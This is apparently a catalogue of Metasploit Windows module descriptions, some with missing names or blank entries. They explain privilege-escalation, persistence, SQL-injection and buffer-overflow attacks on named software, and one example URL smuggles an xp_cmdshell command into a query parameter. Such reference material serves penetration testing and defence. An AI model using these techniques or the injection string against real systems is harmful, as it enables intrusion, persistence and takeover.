Windows allows you to set up a debug process when a process exits. This module uploads a payload and declares that it is the debug process to launch when a specified process exits.

windows/local/persistence_service
This Module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.

windows/local/plantronics_hub_spokesupdateservice_privesc
The Plantronics Hub client application for Windows makes use of an automatic update service `SpokesUpdateService.exe` which automatically executes a file specified in the `MajorUpgrade.config` configuration file as SYSTEM. The configuration file is writable by all users by default. This module has been tested successfully on Plantronics Hub version 3.13.2 on Windows 7 SP1 (x64).

windows/local/powershell_cmd_upgrade
This module executes Powershell to upgrade a Windows Shell session to a full Meterpreter session.

windows/local/powershell_remoting
This module uses Powershell Remoting (TCP 47001) to inject payloads on target machines. If RHOSTS are specified, it will try to resolve the IPs to hostnames, otherwise use a HOSTFILE to supply a list of known hostnames.

windows/local/ppr_flatten_rec
This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage of uninitialized data which allows to corrupt memory. At the moment, the module has been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.

windows/local/ps_persist
This module generates a dynamic executable on the session host using .NET templates. Code is pulled from C# templates and impregnated with a payload before being sent to a modified PowerShell session with .NET 4 loaded. The compiler builds the executable (standard or Windows service) in memory and produces a binary which can be started/installed and downloaded for later use. After compilation the PoweShell session can also sign the executable if provided a path the a .pfx formatted certificate.

windows/local/ps_wmi_exec
This module uses WMI execution to launch a payload instance on a remote machine. In order to avoid AV detection, all execution is performed in memory via psh-net encoded payload. Persistence option can be set to keep the payload looping while a handler is present to receive it. By default the module runs as the current process owner. The module can be configured with credentials for the remote host with which to launch the process.

windows/local/pxeexploit
This module provides a PXE server, running a DHCP and TFTP server. The default configuration loads a linux kernel and initrd into memory that reads the hard drive; placing the payload on the hard drive of any Windows partition seen. Note: the displayed IP address of a target is the address this DHCP server handed out, not the "normal" IP address the host uses.

windows/local/razer_zwopenprocess
A vulnerability exists in the latest version of Razer Synapse (v2.20.15.1104 as of the day of disclosure) which can be leveraged locally by a malicious application to elevate its privileges to those of NT_AUTHORITY\SYSTEM. The vulnerability lies in a specific IOCTL handler in the rzpnk.sys driver that passes a PID specified by the user to ZwOpenProcess. This can be issued by an application to open a handle to an arbitrary process with the necessary privileges to allocate, read and write memory in the specified process. This exploit leverages this vulnerability to open a handle to the winlogon process (which runs as NT_AUTHORITY\SYSTEM) and infect it by installing a hook to execute attacker controlled shellcode. This hook is then triggered on demand by calling user32!LockWorkStation(), resulting in the attacker's payload being executed with the privileges of the infected winlogon process. In order for the issued IOCTL to work, the RazerIngameEngine.exe process must not be running. This exploit will check if it is, and attempt to kill it as necessary. The vulnerable software can be found here: https://www.razerzone.com/synapse/. No Razer hardware needs to be connected in order to leverage this vulnerability. This exploit is not opsec-safe due to the user being logged out as part of the exploitation process.

windows/local/registry_persistence
This module will install a payload that is executed during boot. It will be executed either at user logon or system startup via the registry value in "CurrentVersion\Run" (depending on privilege and selected method). The payload will be installed completely in registry.

windows/local/ricoh_driver_privesc
Various Ricoh printer drivers allow escalation of privileges on Windows systems. For vulnerable drivers, a low-privileged user can read/write files within the `RICOH_DRV` directory and its subdirectories. `PrintIsolationHost.exe`, a Windows process running as NT AUTHORITY\SYSTEM, loads driver-specific DLLs during the installation of a printer. A user can elevate to SYSTEM by writing a malicious DLL to the vulnerable driver directory and adding a new printer with a vulnerable driver. This module leverages the `prnmngr.vbs` script to add and delete printers. Multiple runs of this module may be required given successful exploitation is time-sensitive.

windows/local/run_as
This module will login with the specified username/password and execute the supplied command as a hidden process. Output is not returned by default. Unless targeting a local user either set the DOMAIN, or specify a UPN user format (e.g. user@domain). This uses the CreateProcessWithLogonW WinAPI function. A custom command line can be sent instead of uploading an executable. APPLICAITON_NAME and COMMAND_LINE are passed to lpApplicationName and lpCommandLine respectively. See the MSDN documentation for how these two values interact.

windows/local/s4u_persistence
Creates a scheduled task that will run using service-for-user (S4U). This allows the scheduled task to run even as an unprivileged user that is not logged into the device. This will result in lower security context, allowing access to local resources only. The module requires 'Logon as a batch job' permissions (SeBatchLogonRight).

windows/local/service_permissions
This module attempts to exploit existing administrative privileges to obtain a SYSTEM session. If directly creating a service fails, this module will inspect existing services to look for insecure configuration, file or registry permissions that may be hijacked. It will then attempt to restart the replaced service to run the payload. This will result in a new session when this succeeds.

windows/local/srclient_dll_hijacking
All editions of Windows Server 2012 (but not 2012 R2) are vulnerable to DLL hijacking due to the way TiWorker.exe will try to call the non-existent `SrClient.dll` file when Windows Update checks for updates. This issue can be leveraged for privilege escalation if %PATH% includes directories that are writable by low-privileged users. The attack can be triggered by any low-privileged user and does not require a system reboot. This module has been successfully tested on Windows Server 2012 (x64).

windows/local/tokenmagic
This module leverages a UAC bypass (TokenMagic) in order to spawn a process/conduct a DLL hijacking attack to gain SYSTEM-level privileges. Windows 7 through Windows 10 1803 are affected.

windows/local/unquoted_service_path
This module exploits a logic flaw due to how the lpApplicationName parameter is handled. When the lpApplicationName contains a space, the file name is ambiguous. Take this file path as example: C:\program files\hello.exe; The Windows API will try to interpret this as two possible paths: C:\program.exe, and C:\program files\hello.exe, and then execute all of them. To some software developers, this is an unexpected behavior, which becomes a security problem if an attacker is able to place a malicious executable in one of these unexpected paths, sometimes escalate privileges if run as SYSTEM. Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the same problem. The offensive technique is also described in Writing Secure Code (2nd Edition), Chapter 23, in the section "Calling Processes Security" on page 676. This technique was previously called Trusted Service Path, but is more commonly known as Unquoted Service Path. The service exploited won't start until the payload written to disk is removed.

windows/local/virtual_box_guest_additions
A vulnerability within the VBoxGuest driver allows an attacker to inject memory they control into an arbitrary location they define. This can be used by an attacker to overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest Additions up to 4.3.10r93012.

windows/local/virtual_box_opengl_escape
This module exploits a vulnerability in the 3D Acceleration support for VirtualBox. The vulnerability exists in the remote rendering of OpenGL-based 3D graphics. By sending a sequence of specially crafted rendering messages, a virtual machine can exploit an out of bounds array access to corrupt memory and escape to the host. This module has been tested successfully on Windows 7 SP1 (64 bits) as Host running Virtual Box 4.3.6.

windows/local/vss_persistence
This module will attempt to create a persistent payload in a new volume shadow copy. This is based on the VSSOwn Script originally posted by Tim Tomes and Mark Baggett. This module has been tested successfully on Windows 7. In order to achieve persistence through the RUNKEY option, the user should need password in order to start session on the target machine.

windows/local/webexec
This module exploits a flaw in the 'webexservice' Windows service, which runs as SYSTEM, can be used to run arbitrary commands locally, and can be started by limited users in default installations.

windows/local/win_error_cve_2023_36874
This module takes advantage of a bug in the way Windows error reporting opens the report parser. If you open a report, Windows uses a relative path to locate the rendering program. By creating a specific alternate directory structure, we can coerce Windows into opening an arbitrary executable as SYSTEM. If the current user is a local admin, the system will attempt impersonation and the exploit will fail.

windows/local/windscribe_windscribeservice_priv_esc
The Windscribe VPN client application for Windows makes use of a Windows service `WindscribeService.exe` which exposes a named pipe `\.\pipe\WindscribeService` allowing execution of programs with elevated privileges. Windscribe versions prior to 1.82 do not validate user-supplied program names, allowing execution of arbitrary commands as SYSTEM. This module has been tested successfully on Windscribe versions 1.80 and 1.81 on Windows 7 SP1 (x64).

windows/local/wmi
This module executes powershell on the remote host using the current user credentials or those supplied. Instead of using PSEXEC over TCP port 445 we use the WMIC command to start a Remote Procedure Call on TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel traffic through that session. The result is similar to psexec but with the added benefit of using the session's current authentication token instead of having to know a password or hash. The remote host must be configured to allow remote Windows Management Instrumentation.

windows/local/wmi_persistence
This module will create a permanent WMI event subscription to achieve file-less persistence using one of five methods. The EVENT method will create an event filter that will query the event log for an EVENT_ID_TRIGGER (default: failed logon request id 4625) that also contains a specified USERNAME_TRIGGER (note: failed logon auditing must be enabled on the target for this method to work, this can be enabled using "auditpol.exe /set /subcategory:Logon /failure:Enable"). When these criteria are met a command line event consumer will trigger an encoded powershell payload. The INTERVAL method will create an event filter that triggers the payload after the specified CALLBACK_INTERVAL. The LOGON method will create an event filter that will trigger the payload after the system has an uptime of 4 minutes. The PROCESS method will create an event filter that triggers the payload when the specified process is started. The WAITFOR method creates an event filter that utilizes the Microsoft binary waitfor.exe to wait for a signal specified by WAITFOR_TRIGGER before executing the payload. The signal can be sent from a windows host on a LAN utilizing the waitfor.exe command (note: requires target to have port 445 open). Additionally a custom command can be specified to run once the trigger is activated using the advanced option CUSTOM_PS_COMMAND. This module requires administrator level privileges as well as a high integrity process. It is also recommended not to use stageless payloads due to powershell script length limitations.

windows/lotus/domino_http_accept_language
This module exploits a stack buffer overflow in IBM Lotus Domino Web Server prior to version 7.0.3FP1 and 8.0.1. This flaw is triggered by any HTTP request with an Accept-Language header greater than 114 bytes.

windows/lotus/domino_icalendar_organizer
This module exploits a vulnerability found in IBM Lotus Domino iCalendar. By sending a long string of data as the "ORGANIZER;mailto" header, process "nRouter.exe" crashes due to a Cstrcpy() routine in nnotes.dll, which allows remote attackers to gain arbitrary code execution. Note: In order to trigger the vulnerable code path, a valid Domino mailbox account is needed.

windows/misc/achat_bof
This module exploits a Unicode SEH buffer overflow in Achat. By sending a crafted message to the default port 9256/UDP, it's possible to overwrite the SEH handler. Even when the exploit is reliable, it depends on timing since there are two threads overflowing the stack in the same time. This module has been tested on Achat v0.150 running on Windows XP SP3 and Windows 7.

windows/misc/actfax_raw_server_bof
This module exploits a vulnerability in ActFax Server 5.01 RAW server. The RAW Server can be used to transfer fax messages without any underlying protocols. To note significant fields in the fax being transferred, like the fax number or the recipient, ActFax data fields can be used. This module exploits a buffer overflow in the handling of the @F506 fields due to the insecure usage of strcpy. This module has been tested successfully on ActFax 5.01 over Windows XP SP3 (English).

windows/misc/agentxpp_receive_agentx
This exploits a stack buffer overflow in the AgentX++ library, as used by various applications. By sending a specially crafted request, an attacker can execute arbitrary code, potentially with SYSTEM privileges. This module was tested successfully against master.exe as included with Real Network\'s Helix Server v12. When installed as a service with Helix Server, the service runs as SYSTEM, has no recovery action, but will start automatically on boot. This module does not work with NX/XD enabled but could be modified easily to do so. The address

windows/misc/ahsay_backup_fileupload
This module exploits an authenticated insecure file upload and code execution flaw in Ahsay Backup v7.x - v8.1.1.50. To succesfully execute the upload credentials are needed, default on Ahsay Backup trial accounts are enabled so an account can be created. It can be exploited in Windows and Linux environments to get remote code execution (usualy as SYSTEM). This module has been tested successfully on Ahsay Backup v8.1.1.50 with Windows 2003 SP2 Server. Because of this flaw all connected clients can be configured to execute a command before the backup starts. Allowing an attacker to takeover even more systems and make it rain shells! Setting the CREATEACCOUNT to true will create a new account, this is enabled by default. If credeantials are known enter these and run the exploit.

windows/misc/ais_esel_server_rce
This module will execute an arbitrary payload on an "ESEL" server used by the AIS logistic software. The server typically listens on port 5099 without TLS. There could also be server listening on 5100 with TLS but the port 5099 is usually always open. The login process is vulnerable to an SQL Injection. Usually a MSSQL Server with the 'sa' user is in place. This module was verified on version 67 but it should also run on lower versions. An fixed version was created by AIS in September 2017. However most systems have not been updated. In regard to the payload, unless there is a closed port in the web server, you dont want to use any "bind" payload. You want a "reverse" payload, probably to your port 80 or to any other outbound port allowed on the firewall. Currently, one delivery method is supported This method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target. NOTE: This module will leave a payload executable on the target system when the attack is finished.

windows/misc/allmediaserver_bof
This module exploits a stack buffer overflow in ALLMediaServer 0.8. The vulnerability is caused due to a boundary error within the handling of HTTP request. While the exploit supports DEP bypass via ROP, on Windows 7 the stack pivoting isn't reliable across virtual (VMWare, VirtualBox) and physical environments. Because of this the module isn't using DEP bypass on the Windows 7 SP1 target, where by default DEP is OptIn and AllMediaServer won't run with DEP.

windows/misc/altiris_ds_sqli
This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8 to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize numeric input fields in "UpdateComputer" notification Requests. In order to spawn a shell, several SQL injections are required in close succession, first to enable xp_cmdshell, then retrieve the payload via TFTP and finally execute it. The module also has the capability to disable or enable local application authentication. In order to work the target system must have a tftp client available.

windows/misc/apple_quicktime_rtsp_response

windows/misc/eureka_mail_err
This module exploits a buffer overflow in the Eureka Email 2.2q client that is triggered through an excessively long ERR message. NOTE: this exploit isn't very reliable. Unfortunately reaching the vulnerable code can only be done when manually checking mail (Ctrl-M). Checking at startup will not reach the code targeted here.

windows/misc/fb_cnct_group
This module exploits a vulnerability in Firebird SQL Server. A specially crafted packet can be sent which will overwrite a pointer allowing the attacker to control where data is read from. Shortly, following the controlled read, the pointer is called resulting in code execution. The vulnerability exists with a group number extracted from the CNCT information, which is sent by the client, and whose size is not properly checked. This module uses an existing call to memcpy, just prior to the vulnerable code, which allows a small amount of data to be written to the stack. A two-phases stack pivot allows to execute the ROP chain which ultimately is used to execute VirtualAlloc and bypass DEP.

windows/misc/fb_isc_attach_database

windows/misc/hp_dataprotector_dtbclslogin
This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The overflow occurs during the login process, in the DtbClsLogin function provided by the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an insecure way with the username. A successful exploitation will lead to code execution with the privileges of the "dpwinsdr.exe" (HP Data Protector Express Domain Server Service) process, which runs as SYSTEM by default.

windows/misc/hp_dataprotector_encrypted_comms
This module exploits a well known remote code execution exploit after establishing encrypted control communications with a Data Protector agent. This allows exploitation of Data Protector agents that have been configured to only use encrypted control communications. This exploit works by executing the payload with Microsoft PowerShell so will only work against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows Server 2008 R2.

windows/misc/hp_dataprotector_exec_bar

windows/misc/hp_dataprotector_install_service
This module exploits HP Data Protector OmniInet process on Windows only. This exploit invokes the install service function which allows an attacker to create a custom payload in the format of an executable. To ensure this works, the SMB server created in MSF must have a share called Omniback which has a subfolder i386, i.e. \\192.168.1.1\Omniback\i386\

windows/misc/hp_dataprotector_new_folder
This module exploits a stack buffer overflow in HP Data Protector 5. The overflow occurs in the creation of new folders, where the name of the folder is handled in a insecure way by the dpwindtb.dll component. While the overflow occurs in the stack, the folder name is split in fragments in this insecure copy. Because of this, this module uses egg hunting to search a non corrupted copy of the payload in the heap. On the other hand the overflowed buffer is stored in a frame protected by stack cookies, because of this SEH handler overwrite is used. Any user of HP Data Protector Express is able to create new folders and trigger the vulnerability. Moreover, in the default installation the 'Admin' user has an empty password. Successful exploitation will lead to code execution with the privileges of the "dpwinsdr.exe" (HP Data Protector Express Domain Server Service) process, which runs as SYSTEM by default.

windows/misc/hp_dataprotector_traversal
This module exploits a directory traversal vulnerability in the Hewlett-Packard Data Protector product.

windows/misc/itunes_extm3u_bof
This module exploits a stack buffer overflow in iTunes 10.4.0.80 to 10.6.1.7. When opening an extended .m3u file containing an "#EXTINF:" tag description, iTunes will copy the content after "#EXTINF:" without appropriate checking from a heap buffer to a stack buffer, writing beyond the stack buffer's boundary, which allows code execution under the context of the user. Please note before using this exploit, you must have precise knowledge of the victim machine's QuickTime version (if installed), and then select your target accordingly. In addition, even though this exploit can be used as remote, you should be aware the victim's browser behavior when opening an itms link. For example, IE/Firefox/Opera by default will ask the user for permission before launching the itms link by iTunes. Chrome will ask for permission, but also spits a warning. Safari would be an ideal target, because it will open the link without any user interaction.

windows/misc/ivanti_avalanche_mdm_bof

A DLL side loading vulnerability was found in the VMware Host Guest Client Redirector, a component of VMware Tools. This issue can be exploited by luring a victim into opening a document from the attacker's share. An attacker can exploit this issue to execute arbitrary code with the privileges of the target user. This can potentially result in the attacker taking complete control of the affected system. If the WebDAV Mini-Redirector is enabled, it is possible to exploit this issue over the internet.

windows/misc/webdav_delivery
This module simplifies the rundll32.exe Application Whitelisting Bypass technique. The module creates a webdav server that hosts a dll file. When the user types the provided rundll32 command on a system, rundll32 will load the dll remotly and execute the provided export function. The export function needs to be valid, but the default meterpreter function can be anything. The process does write the dll to C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV but does not load the dll from that location. This file should be removed after execution. The extension can be anything you'd like, but you don't have to use one. Two files will be written to disk. One named the requested name and one with a dll extension attached.

windows/misc/wifi_mouse_rce
The WiFi Mouse (Mouse Server) from Necta LLC contains an auth bypass as the authentication is completely implemented entirely on the client side. By utilizing this vulnerability, is possible to open a program on the server (cmd.exe in our case) and type commands that will be executed as the user running WiFi Mouse (Mouse Server), resulting in remote code execution. Tested against versions 1.8.3.4 (current as of module writing) and 1.8.2.3.

windows/misc/windows_rsh

windows/mssql/lyris_listmanager_weak_pass
This module exploits a weak password vulnerability in the Lyris ListManager MSDE install. During installation, the 'sa' account password is set to 'lminstall'. Once the install completes, it is set to 'lyris' followed by the process ID of the installer. This module brute forces all possible process IDs that would be used by the installer.

windows/mssql/ms02_039_slammer
This is an exploit for the SQL Server 2000 resolution service buffer overflow. This overflow is triggered by sending a udp packet to port 1434 which starts with 0x04 and is followed by long string terminating with a colon and a number. This module should work against any vulnerable SQL Server 2000 or MSDE install (pre-SP3).

windows/mssql/ms02_056_hello
By sending malformed data to TCP port 1433, an unauthenticated remote attacker could overflow a buffer and possibly execute code on the server with SYSTEM level privileges. This module should work against any vulnerable SQL Server 2000 or MSDE install (< SP3).

windows/mssql/ms09_004_sp_replwritetovarbin
A heap-based buffer overflow can occur when calling the undocumented "sp_replwritetovarbin" extended stored procedure. This vulnerability affects all versions of Microsoft SQL Server 2000 and 2005, Windows Internal Database, and Microsoft Desktop Engine (MSDE) without the updates supplied in MS09-004. Microsoft patched this vulnerability in SP3 for 2005 without any public mention. An authenticated database session is required to access the vulnerable code. That said, it is possible to access the vulnerable code via an SQL injection vulnerability. This exploit smashes several pointers, as shown below. 1. pointer to a 32-bit value that is set to 0 2. pointer to a 32-bit value that is set to a length influenced by the buffer length. 3. pointer to a 32-bit value that is used as a vtable pointer. In MSSQL 2000, this value is referenced with a displacement of 0x38. For MSSQL 2005, the displacement is 0x10. The address of our buffer is conveniently stored in ecx when this instruction is executed. 4. On MSSQL 2005, an additional vtable ptr is smashed, which is referenced with a displacement of 4. This pointer is not used by this exploit. This particular exploit replaces the previous dual-method exploit. It uses a technique where the value contained in ecx becomes the stack. From there, return oriented programming is used to normalize the execution state and finally execute the payload via a "jmp esp". All addresses used were found within the sqlservr.exe memory space, yielding very reliable code execution using only a single query. NOTE: The MSSQL server service does not automatically restart by default. That said, some exceptions are caught and will not result in terminating the process. If the exploit crashes the service prior to hijacking the stack, it won't die. Otherwise, it's a goner.

windows/mssql/mssql_clr_payload
This module executes an arbitrary native payload on a Microsoft SQL server by loading a custom SQL CLR Assembly into the target SQL installation, and calling it directly with a base64-encoded payload. The module requires working credentials in order to connect directly to the MSSQL Server. This method requires the user to have sufficient privileges to install a custom SQL CRL DLL, and invoke the custom stored procedure that comes with it. This exploit does not leave any binaries on disk. Tested on MS SQL Server versions: 2005, 2012, 2016 (all x64).

windows/mssql/mssql_linkcrawler
This module can be used to crawl MS SQL Server database links and deploy Metasploit payloads through links configured with sysadmin privileges using a valid SQL Server Login. If you are attempting to obtain multiple reverse shells using this module we recommend setting the "DisablePayloadHandler" advanced option to "true", and setting up a exploit/multi/handler to run in the background as a job to support multiple incoming shells. If you are interested in deploying payloads to specific servers this module also supports that functionality via the "DEPLOYLIST" option. Currently, the module is capable of delivering payloads to both 32bit and 64bit Windows systems via powershell memory injection methods based on Matthew Graeber's work. As a result, the target server must have powershell installed. By default, all of the crawl information is saved to a CSV formatted log file and MSF loot so that the tool can also be used for auditing without deploying payloads.

windows/mssql/mssql_payload
This module executes an arbitrary payload on a Microsoft SQL Server by using the "xp_cmdshell" stored procedure. Currently, three delivery methods are supported. First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems. A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable. By default the Command Stager uses 'wcsript.exe' to generate the executable on the target. Finally, ReL1K's latest method utilizes PowerShell to transmit and recreate the payload on the target. NOTE: This module will leave a payload executable on the target system when the attack is finished.

windows/mssql/mssql_payload_sqli
This module will execute an arbitrary payload on a Microsoft SQL Server, using a SQL injection vulnerability. Once a vulnerability is identified this module will use xp_cmdshell to upload and execute Metasploit payloads. It is necessary to specify the exact point where the SQL injection vulnerability happens. For example, given the following injection: http://www.example.com/show.asp?id=1;exec xp_cmdshell 'dir';--&cat=electrical you would need to set the following path: set GET_PATH /showproduct.asp?id=1;[SQLi];--&cat=foobar In regard to the payload, unless there is a closed port in the web server, you dont want to use any "bind" payload, specially on port 80, as you will stop reaching the vulnerable web server host. You want a "reverse" payload, probably to your port 80 or to any other outbound port allowed on the firewall. For privileged ports execute Metasploit msfconsole as root. Currently, three delivery methods are supported. First, the original method uses Windows 'debug.com'. File size restrictions are avoided by incorporating the debug bypass method presented by SecureStat at Defcon 17. Since this method invokes ntvdm, it is not available on x64 systems. A second method takes advantage of the Command Stager subsystem. This allows using various techniques, such as using a TFTP server, to send the executable.

The module has been successfully tested on Novell ZENworks Configuration Management 10 SP2 / SP3 and Windows Server 2003 SP2 (DEP bypass).

windows/nuuo/nuuo_cms_fu
The COMMITCONFIG verb is used by a CMS client to upload and modify the configuration of the CMS Server. The vulnerability is in the "FileName" parameter, which accepts directory traversal (..\..\) characters. Therefore, this function can be abused to overwrite any files in the installation drive of CMS Server. This vulnerability is exploitable in CMS versions up to and including v2.4. This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided. This module will overwrite the LicenseTool.dll file in the CMS Server installation. If the module fails to restore LicenseTool.dll then the installation will be corrupted and NCS Server will not execute successfully.

windows/nuuo/nuuo_cms_sqli
The Nuuo Central Management Server allows an authenticated user to query the state of the alarms. This functionality can be abused to inject SQL into the query. As SQL Server 2005 Express is installed by default, xp_cmdshell can be enabled and abused to achieve code execution. This module will either use a provided session number (which can be guessed with an auxiliary module) or attempt to login using a provided username and password - it will also try the default credentials if nothing is provided.

windows/oracle/client_system_analyzer_upload
This module exploits an arbitrary file upload vulnerability on the Client Analyzer component as included in Oracle Database 11g, which allows remote attackers to upload and execute arbitrary code.

windows/oracle/tns_service_name
This module exploits a stack buffer overflow in Oracle. When sending a specially crafted packet containing a long SERVICE_NAME to the TNS service, an attacker may be able to execute arbitrary code.

windows/pop3/seattlelab_pass
There exists an unauthenticated buffer overflow vulnerability in the POP3 server of Seattle Lab Mail 5.5 when sending a password with excessive length. Successful exploitation should not crash either the service or the server; however, after initial use the port cannot be reused for successive exploitation until the service has been restarted. Consider using a command execution payload following the bind shell to restart the service if you need to reuse the same port. The overflow appears to occur in the debugging/error reporting section of the slmail.exe executable, and there are multiple offsets that will lead to successful exploitation. This exploit uses 2606, the offset that creates the smallest overall payload. The other offset is 4654. The return address is overwritten with a "jmp esp" call from the application library SLMFC.DLL found in %SYSTEM%\system32\. This return address works against all version of Windows and service packs. The last modification date on the library is dated 06/02/99. Assuming that the code where the overflow occurs has not changed in some time, prior version of SLMail may also be vulnerable with this exploit. The author has not been able to acquire older versions of SLMail for testing purposes. Please let us know if you were able to get this exploit working against other SLMail versions.

windows/postgres/postgres_payload
On default Microsoft Windows installations of PostgreSQL the postgres service account may write to the current directory (which is usually "C:\Program Files\PostgreSQL\<version>\data" where <version> is the major.minor version of PostgreSQL). UDF DLL's may be sourced from there as well. This module uploads a Windows DLL file via the pg_largeobject method of binary injection and creates a UDF (user defined function) from that DLL. Because the payload is run from DllMain, it does not need to conform to specific Postgres API versions.

windows/proxy/bluecoat_winproxy_host
This module exploits a buffer overflow in the Blue Coat Systems WinProxy service by sending a long port value for the Host header in a HTTP request.

windows/proxy/ccproxy_telnet_ping
This module exploits the YoungZSoft CCProxy <= v6.2 suite Telnet service. The stack is overwritten when sending an overly long address to the 'ping' command.

windows/proxy/proxypro_http_get
This module exploits a stack buffer overflow in Proxy-Pro Professional GateKeeper 4.7. By sending a long HTTP GET to the default port of 3128, a remote attacker could overflow a buffer and execute arbitrary code.

windows/proxy/qbik_wingate_wwwproxy
This module exploits a stack buffer overflow in Qbik WinGate version 6.1.1.1077 and earlier. By sending malformed HTTP POST URL to the HTTP proxy service on port 80, a remote attacker could overflow a buffer and execute arbitrary code.

windows/rdp/cve_2019_0708_bluekeep_rce
The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120, allowing a malformed Disconnect Provider Indication message to cause use-after-free. With a controllable data/size remote nonpaged pool spray, an indirect call gadget of the freed channel is used to achieve arbitrary code execution. Windows 7 SP1 and Windows Server 2008 R2 are the only currently supported targets. Windows 7 SP1 should be exploitable in its default configuration, assuming your target selection is correctly matched to the system's memory layout. HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam *needs* to be set to 0 for exploitation to succeed against Windows Server 2008 R2. This is a non-standard configuration for normal servers, and the target will crash if the aforementioned Registry key is not set! If the target is crashing regardless, you will likely need to determine the non-paged pool base in kernel memory and set it as the GROOMBASE option.

windows/rdp/rdp_doublepulsar_rce
This module executes a Metasploit payload against the Equation Group's DOUBLEPULSAR implant for RDP. While this module primarily performs code execution against the implant, the "Neutralize implant" target allows you to disable the implant.

The issue is due to the handling of unauthenticated EXECUTE operations on the wserver.exe component, which allows arbitrary commands. The component is disabled by default, but required when a project uses the SCIL function WORKSTATION_CALL. This module has been tested successfully on ABB MicroSCADA Pro SYS600 9.3 on Windows XP SP3 and Windows 7 SP1.

windows/scada/advantech_webaccess_dashboard_file_upload
This module exploits an arbitrary file upload vulnerability found in Advantech WebAccess 8.0. This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Advantech WebAccess. Authentication is not required to exploit this vulnerability. The specific flaw exists within the WebAccess Dashboard Viewer. Insufficient validation within the uploadImageCommon function in the UploadAjaxAction script allows unauthenticated callers to upload arbitrary code (instead of an image) to the server, which will then be executed under the high-privilege context of the IIS AppPool.

windows/scada/advantech_webaccess_webvrpcs_bof
This module exploits a stack buffer overflow in Advantech WebAccess 8.2. By sending a specially crafted DCERPC request, an attacker could overflow the buffer and execute arbitrary code.

This module has been tested successfully on Delta Electronics Delta Industrial Automation COMMGR 1.08 over Windows XP SP3, Windows 7 SP1, and Windows 8.1.

windows/scada/factorylink_csservice
This module exploits a vulnerability found on Siemens FactoryLink 8. The vulnerability occurs when CSService.exe processes a CSMSG_ListFiles_REQ message, the user-supplied path first gets converted to ANSI format (CodePage 0), and then gets handled by a logging routine where proper bounds checking is not done, therefore causing a stack-based buffer overflow, and results arbitrary code execution.

windows/scada/factorylink_vrn_09
This module exploits a stack buffer overflow in FactoryLink 7.5, 7.5 SP2, and 8.0.1.703. By sending a specially crafted packet, an attacker may be able to execute arbitrary code due to the improper use of a vsprintf() function while processing the user-supplied text field. Originally found and posted by Luigi Auriemma.

windows/scada/ge_proficy_cimplicity_gefebt
This module abuses the gefebt.exe component in GE Proficy CIMPLICITY, reachable through the CIMPLICIY CimWebServer. The vulnerable component allows to execute remote BCL files in shared resources. An attacker can abuse this behavior to execute a malicious BCL and drop an arbitrary EXE. The last one can be executed remotely through the WebView server. This module has been tested successfully in GE Proficy CIMPLICITY 7.5 with the embedded CimWebServer. This module starts a WebDAV server to provide the malicious BCL files. If the target does not have the WebClient service enabled, an external SMB service is necessary.

windows/scada/iconics_genbroker
The GenBroker service on port 38080 is affected by three integer overflow vulnerabilities while handling opcode 0x4b0, which is caused by abusing the the memory allocations needed for the number of elements passed by the client. This results unexpected behaviors such as direct registry calls, memory location calls, or arbitrary remote code execution. Please note that in order to ensure reliability, this exploit will try to open calc (hidden), inject itself into the process, and then open up a shell session. Also, DEP bypass is supported.

windows/scada/iconics_webhmi_setactivexguid
This module exploits a vulnerability found in ICONICS WebHMI's ActiveX control. By supplying a long string of data to the 'SetActiveXGUID' parameter, GenVersion.dll fails to do any proper bounds checking before this input is copied onto the stack, which causes a buffer overflow, and results arbitrary code execution under the context of the user.

windows/scada/igss9_igssdataserver_listall
This module exploits a vulnerability in the igssdataserver.exe component of 7-Technologies IGSS up to version 9.00.00 b11063. While processing a ListAll command, the application fails to do proper bounds checking before copying data into a small buffer on the stack. This causes a buffer overflow and allows to overwrite a structured exception handling record on the stack, allowing for unauthenticated remote code execution. Also, after the payload exits, IGSSdataServer.exe should automatically recover.

windows/scada/igss9_igssdataserver_rename
This module exploits a vulnerability found on 7-Technologies IGSS 9. By supplying a long string of data to the 'Rename' (0x02), 'Delete' (0x03), or 'Add' (0x04) command, a buffer overflow condition occurs in IGSSdataServer.exe while handing an RMS report, which results arbitrary code execution under the context of the user. The attack is carried out in three stages. The first stage sends the final payload to IGSSdataServer.exe, which will remain in memory. The second stage sends the Add command so the process can find a valid ID for the Rename command. The last stage then triggers the vulnerability with the Rename command, and uses an egghunter to search for the shellcode that we sent in stage 1. The use of egghunter appears to be necessary due to the small buffer size, which cannot even contain our ROP chain and the final payload.

windows/scada/igss9_misc
This module exploits multiple vulnerabilities found on IGSS 9's Data Server and Data Collector services. The initial approach is first by transferring our binary with Write packets (opcode 0x0D) via port 12401 (igssdataserver.exe), and then send an EXE packet (opcode 0x0A) to port 12397 (dc.exe), which will cause dc.exe to run that payload with a CreateProcessA() function as a new thread.

windows/scada/igss_exec_17
This module abuses a directory traversal flaw in Interactive Graphical SCADA System v9.00. In conjunction with the traversal flaw, if opcode 0x17 is sent to the dc.exe process, an attacker may be able to execute arbitrary system commands.

windows/scada/indusoft_webstudio_exec
